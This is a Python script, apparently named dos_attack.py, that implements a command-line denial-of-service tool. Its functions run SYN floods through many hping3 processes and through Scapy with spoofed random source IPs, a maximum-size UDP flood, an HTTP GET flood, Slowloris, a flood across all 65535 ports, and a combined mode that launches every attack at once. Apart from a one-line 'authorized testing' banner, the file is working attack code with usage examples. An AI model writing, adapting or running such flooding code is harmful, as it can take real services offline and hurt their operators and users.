
import sys
import subprocess
import socket
import random
import time
import threading
import signal
from datetime import datetime
from multiprocessing import Process, Value, Manager

# Global flag for stopping attacks
stop_attack = False
attack_stats = {'packets_sent': 0, 'connections': 0}

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global stop_attack
    print("\n[!] Stopping attack...")
    stop_attack = True

signal.signal(signal.SIGINT, signal_handler)

def ultra_syn_flood(target_ip, target_port, duration=60, threads=100):
    """Ultra-aggressive multi-threaded SYN flood"""
    global stop_attack, attack_stats
    print(f"[*] Launching ULTRA SYN Flood attack")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Duration: {duration} seconds")
    
    def hping_worker(thread_id):
        """Individual hping3 thread"""
        # Maximum aggression: -c 100000000 (100M packets), --flood, -V (verbose), -d 65495 (max data size)
        cmd = f"timeout {duration} hping3 -S --flood -V -p {target_port} -d 65495 --rand-source {target_ip}"
        try:
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"[!] Thread {thread_id} error: {e}")
    
    # Launch multiple hping3 instances
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=hping_worker, args=(i,))
        t.daemon = True
        t.start()
        threads_list.append(t)
        time.sleep(0.1)  # Slight delay to avoid overwhelming local system
    
    print(f"[+] {threads} attack threads launched!")
    print("[*] Press Ctrl+C to stop the attack")
    
    start_time = time.time()
    try:
        while time.time() - start_time < duration and not stop_attack:
            elapsed = int(time.time() - start_time)
            print(f"\r[*] Attack running... {elapsed}/{duration}s", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    print("\n[+] SYN Flood completed")

def raw_socket_syn_flood(target_ip, target_port, duration=60):
    """Raw socket SYN flood (requires root)"""
    global stop_attack
    print(f"[*] Launching Raw Socket SYN Flood")
    print(f"[*] Target: {target_ip}:{target_port}")
    
    try:
        import scapy.all as scapy
        
        start_time = time.time()
        count = 0
        
        print("[+] Building malicious packets...")
        
        while time.time() - start_time < duration and not stop_attack:
            # Random source IP to evade filtering
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # Craft SYN packet
            packet = scapy.IP(src=src_ip, dst=target_ip) / scapy.TCP(
                sport=random.randint(1024, 65535),
                dport=int(target_port),
                flags="S",
                seq=random.randint(1000, 9000)
            )
            
            # Send without waiting for response
            scapy.send(packet, verbose=False)
            count += 1
            
            if count % 1000 == 0:
                print(f"\r[*] Packets sent: {count}", end='', flush=True)
        
        print(f"\n[+] Raw Socket Flood completed - {count} packets sent")
        
    except ImportError:
        print("[!] Scapy not installed. Install with: pip3 install scapy")
        print("[!] Falling back to hping3...")
        ultra_syn_flood(target_ip, target_port, duration, threads=50)
    except Exception as e:
        print(f"[!] Error: {e}")

def mega_udp_flood(target_ip, target_port, duration=60, packet_size=65507):
    """Mega UDP flood with maximum packet size"""
    global stop_attack
    print(f"[*] Launching MEGA UDP Flood")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Packet size: {packet_size} bytes")
    
    def udp_sender():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(packet_size)
        count = 0
        
        while not stop_attack:
            try:
                sock.sendto(payload, (target_ip, int(target_port)))
                count += 1
                if count % 100 == 0:
                    attack_stats['packets_sent'] += 100
            except:
                pass
    
    # Launch 50 threads
    threads = []
    for _ in range(50):
        t = threading.Thread(target=udp_sender)
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"[+] 50 UDP flood threads launched!")
    print("[*] Press Ctrl+C to stop")
    
    start_time = time.time()
    try:
        while time.time() - start_time < duration and not stop_attack:
            elapsed = int(time.time() - start_time)
            print(f"\r[*] Running: {elapsed}/{duration}s | Packets: {attack_stats['packets_sent']}", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    stop_attack = True
    print("\n[+] UDP Flood completed")

def nuclear_http_flood(target_ip, target_port, duration=60):
    """Nuclear-level HTTP flood with multiple methods"""
    global stop_attack
    print(f"[*] Launching NUCLEAR HTTP Flood")
    print(f"[*] Target: {target_ip}:{target_port}")
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (X11; Linux x86_64)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
    ]
    
    def http_requester():
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, int(target_port)))
                
                # Send multiple requests per connection
                for _ in range(10):
                    request = f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n"
                    request += f"Host: {target_ip}\r\n"
                    request += f"User-Agent: {random.choice(user_agents)}\r\n"
                    request += f"Accept: */*\r\n"
                    request += f"Connection: keep-alive\r\n\r\n"
                    sock.send(request.encode())
                
                sock.close()
                attack_stats['connections'] += 1
            except:
                pass
    
    # Launch 100 threads
    threads = []
    for _ in range(100):
        t = threading.Thread(target=http_requester)
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"[+] 100 HTTP flood threads launched!")
    print("[*] Press Ctrl+C to stop")
    
    start_time = time.time()
    try:
        while time.time() - start_time < duration and not stop_attack:
            elapsed = int(time.time() - start_time)
            print(f"\r[*] Running: {elapsed}/{duration}s | Connections: {attack_stats['connections']}", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    stop_attack = True
    print("\n[+] HTTP Flood completed")

def enhanced_slowloris(target_ip, target_port, duration=60):
    """Enhanced Slowloris with more connections"""
    global stop_attack
    print(f"[*] Launching Enhanced Slowloris")
    print(f"[*] Target: {target_ip}:{target_port}")
    
    sockets = []
    
    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, int(target_port)))
            s.send(f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            s.send("Accept: text/html\r\n".encode())
            return s
        except:
            return None
    
    start_time = time.time()
    
    try:
        # Create 2000 initial connections
        print("[+] Creating initial connections...")
        for i in range(2000):
            sock = create_socket()
            if sock:
                sockets.append(sock)
            if i % 100 == 0:
                print(f"\r[*] Created {len(sockets)} connections", end='', flush=True)
        
        print(f"\n[+] Created {len(sockets)} connections")
        
        while time.time() - start_time < duration and not stop_attack:
            elapsed = int(time.time() - start_time)
            print(f"\r[*] Running: {elapsed}/{duration}s | Active: {len(sockets)}", end='', flush=True)
            
            # Keep connections alive
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode())
                except:
                    sockets.remove(s)
            
            # Add 100 new connections per cycle
            for _ in range(100):
                sock = create_socket()
                if sock:
                    sockets.append(sock)
            
            time.sleep(3)
        
        print("\n[+] Slowloris completed")
        
    except KeyboardInterrupt:
        print("\n[!] Attack stopped")
    finally:
        for s in sockets:
            try:
                s.close()
            except:
                pass

def nuclear_all_ports(target_ip, duration=60):
    """NUCLEAR OPTION: Attack ALL ports simultaneously"""
    global stop_attack
    print(f"[*] Launching NUCLEAR ALL-PORTS Attack")
    print(f"[*] Target: {target_ip}")
    print(f"[*] This will attack ALL 65535 ports simultaneously!")
    print("[!] This is EXTREMELY aggressive!")
    
    confirm = input("[?] Type 'NUCLEAR' to confirm: ")
    if confirm != "NUCLEAR":
        print("[!] Attack cancelled")
        return
    
    def port_attacker(port_range):
        """Attack a range of ports"""
        for port in port_range:
            if stop_attack:
                break
            try:
                # SYN flood each port
                cmd = f"timeout 2 hping3 -S --flood -p {port} {target_ip} > /dev/null 2>&1 &"
                subprocess.Popen(cmd, shell=True)
            except:
                pass
    
    # Divide ports among threads
    threads = []
    ports_per_thread = 65535 // 50
    
    for i in range(50):
        start_port = i * ports_per_thread + 1
        end_port = (i + 1) * ports_per_thread
        port_range = range(start_port, min(end_port, 65536))
        
        t = threading.Thread(target=port_attacker, args=(port_range,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"[+] 50 threads attacking all ports!")
    print("[*] Press Ctrl+C to stop")
    
    start_time = time.time()
    try:
        while time.time() - start_time < duration and not stop_attack:
            elapsed = int(time.time() - start_time)
            print(f"\r[*] NUCLEAR attack running: {elapsed}/{duration}s", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    stop_attack = True
    print("\n[+] Nuclear attack completed")
    
    # Kill all hping3 processes
    subprocess.run("pkill -9 hping3", shell=True)

def ultimate_ddos(target_ip, target_port, duration=60):
    """Ultimate DDoS - ALL attack types simultaneously"""
    global stop_attack
    print(f"[*] Launching ULTIMATE DDoS")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] This combines ALL attack vectors!")
    print("[!] This is MAXIMUM aggression!")
    
    confirm = input("[?] Type 'ULTIMATE' to confirm: ")
    if confirm != "ULTIMATE":
        print("[!] Attack cancelled")
        return
    
    processes = []
    
    # Launch all attacks in parallel
    attacks = [
        Process(target=ultra_syn_flood, args=(target_ip, target_port, duration, 50)),
        Process(target=mega_udp_flood, args=(target_ip, target_port, duration)),
        Process(target=nuclear_http_flood, args=(target_ip, target_port, duration)),
        Process(target=enhanced_slowloris, args=(target_ip, target_port, duration)),
    ]
    
    print(f"[+] Starting {len(attacks)} parallel attack vectors...")
    
    for attack in attacks:
        attack.start()
        processes.append(attack)
        time.sleep(1)
    
    print("[+] All attack vectors launched!")
    print("[*] Press Ctrl+C to stop all attacks")
    
    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Stopping all attacks...")
        for p in processes:
            p.terminate()
    
    print("[+] Ultimate DDoS completed")

def main():
    global stop_attack
    
    print("="*70)
    print(" ENHANCED AGGRESSIVE DoS ATTACK SYSTEM")
    print(" FOR AUTHORIZED SECURITY TESTING ONLY")
    print("="*70)
    
    if len(sys.argv) < 2:
        print("\nUsage:")
        print("  python3 dos_attack.py <target_ip> <target_port> <attack_type> [duration]")
        print("  python3 dos_attack.py <target_ip> nuclear [duration]")
        print("\nAttack Types:")
        print("  ultra_syn      - Ultra-aggressive SYN flood (100 threads)")
        print("  raw_syn        - Raw socket SYN flood (requires root)")
        print("  mega_udp       - Mega UDP flood (50 threads)")
        print("  nuclear_http   - Nuclear HTTP flood (100 threads)")
        print("  enhanced_slow  - Enhanced Slowloris (2000 connections)")
        print("  nuclear        - Attack ALL ports simultaneously")
        print("  ultimate       - ALL attacks combined (MAXIMUM)")
        print("\nControl:")
        print("  Press Ctrl+C at any time to stop the attack")
        print("\nExamples:")
        print("  python3 dos_attack.py 192.168.1.100 80 ultra_syn 60")
        print("  python3 dos_attack.py 192.168.1.100 nuclear 120")
        print("="*70)
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    if sys.argv[2] == "nuclear":
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
        target_port = 80
        attack_type = "nuclear"
    elif sys.argv[2] == "ultimate":
        duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
        target_port = sys.argv[3] if len(sys.argv) > 3 else 80
        attack_type = "ultimate"
    else:
        target_port = sys.argv[2]
        attack_type = sys.argv[3] if len(sys.argv) > 3 else "ultra_syn"
        duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
    
    print(f"\nTimestamp: {datetime.now()}")
    print(f"Target IP: {target_ip}")
    print(f"Target Port: {target_port}")
    print(f"Attack Type: {attack_type}")
    print(f"Duration: {duration} seconds")
    print("="*70)
    print("[*] Press Ctrl+C at any time to stop the attack")
    print("="*70 + "\n")
    
    attack_map = {
        'ultra_syn': lambda: ultra_syn_flood(target_ip, target_port, duration, 100),
        'raw_syn': lambda: raw_socket_syn_flood(target_ip, target_port, duration),
        'mega_udp': lambda: mega_udp_flood(target_ip, target_port, duration),
        'nuclear_http': lambda: nuclear_http_flood(target_ip, target_port, duration),
        'enhanced_slow': lambda: enhanced_slowloris(target_ip, target_port, duration),
        'nuclear': lambda: nuclear_all_ports(target_ip, duration),
        'ultimate': lambda: ultimate_ddos(target_ip, target_port, duration)
    }
    
    attack_func = attack_map.get(attack_type)
    
    if attack_func:
        try:
            attack_func()
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
            stop_attack = True
    else:
        print(f"[!] Unknown attack type: {attack_type}")
        sys.exit(1)
    
    # Cleanup
    print("\n" + "="*70)
    print("[*] Cleaning up...")
    subprocess.run("pkill -9 hping3", shell=True, stderr=subprocess.DEVNULL)
    print("[+] Attack Session Complete")
    print("="*70)

if __name__ == "__main__":
    main()